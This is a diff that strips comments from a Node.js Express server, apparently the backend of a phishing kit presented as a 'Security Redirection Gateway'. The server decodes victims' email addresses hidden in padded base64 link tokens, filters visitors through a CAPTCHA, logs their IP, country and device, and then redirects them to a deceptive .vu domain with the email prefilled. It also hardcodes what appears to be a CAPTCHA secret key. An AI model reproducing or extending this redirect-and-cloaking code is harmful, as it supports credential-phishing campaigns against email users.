@@ -12,7 +12,6 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Helper: Extract client IP
 function getClientIp(req) {
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
@@ -21,7 +20,6 @@ function getClientIp(req) {
     return req.socket.remoteAddress || '0.0.0.0';
 }
 
-// Helper: Geolocate IP
 async function lookupCountry(ip) {
     try {
         const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 3000 });
@@ -31,7 +29,6 @@ async function lookupCountry(ip) {
     }
 }
 
-// Helper: Detect Mobile/PC
 function detectDeviceType(ua) {
     if (!ua) return 'PC';
     const lowercaseUa = ua.toLowerCase();
@@ -42,7 +39,6 @@ function detectDeviceType(ua) {
     return 'PC';
 }
 
-// Logger: visitor logging
 const logPath = path.join(__dirname, 'visitors.log');
 function logVisitor(ip, ua, country, device) {
     try {
@@ -78,7 +74,6 @@ function logVisitor(ip, ua, country, device) {
     }
 }
 
-// Helper: Parse and decode base64 email
 function extractEmail(segment) {
     if (!segment) return null;
 
@@ -89,7 +84,6 @@ function extractEmail(segment) {
         target = target.substring(1);
     }
 
-    // Normalize base64
     let normalized = target.replace(/-/g, '+').replace(/_/g, '/');
     const padding = normalized.length % 4;
     if (padding > 0) {
@@ -103,17 +97,14 @@ function extractEmail(segment) {
             return decoded;
         }
     } catch (e) {
-        // Ignore decoding errors
     }
     return null;
 }
 
-// GET: Health Check
 app.get('/', (req, res) => {
     res.json({ status: 'online', service: 'Security Redirection Gateway API' });
 });
 
-// POST: Verify Turnstile Token and generate redirect URL
 app.post('/verify', async (req, res) => {
     const { token, emailB64 } = req.body;
 
@@ -121,11 +112,9 @@ app.post('/verify', async (req, res) => {
         return res.status(400).json({ status: 'error', message: 'Missing token or email parameters.' });
     }
 
-    // Extract base64 segment from either path format or direct string
     const urlSegments = emailB64.split('/').filter(Boolean);
     const rawSegment = urlSegments[urlSegments.length - 1] || emailB64;
 
-    // Strip the 6 random prefix characters and 8 random suffix characters
     const cleanB64 = rawSegment.length > 14 ? rawSegment.substring(6, rawSegment.length - 8) : rawSegment;
 
     const decodedEmail = extractEmail(cleanB64);
@@ -137,7 +126,6 @@ app.post('/verify', async (req, res) => {
 
     try {
         const secretKey = process.env.RECAPTCHA_SECRET_KEY || '6LcpGUktAAAAAHyp97krWyWMHjONdjCzXxk88CDc';
-        // Verify reCAPTCHA challenge token
         const response = await axios.post(
             'https://www.google.com/recaptcha/api/siteverify',
             new URLSearchParams({
@@ -156,7 +144,6 @@ app.post('/verify', async (req, res) => {
 
             logVisitor(clientIp, ua, country, device);
 
-            // Build the success redirect URL, attaching the email parameters
             const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
             const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
             const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
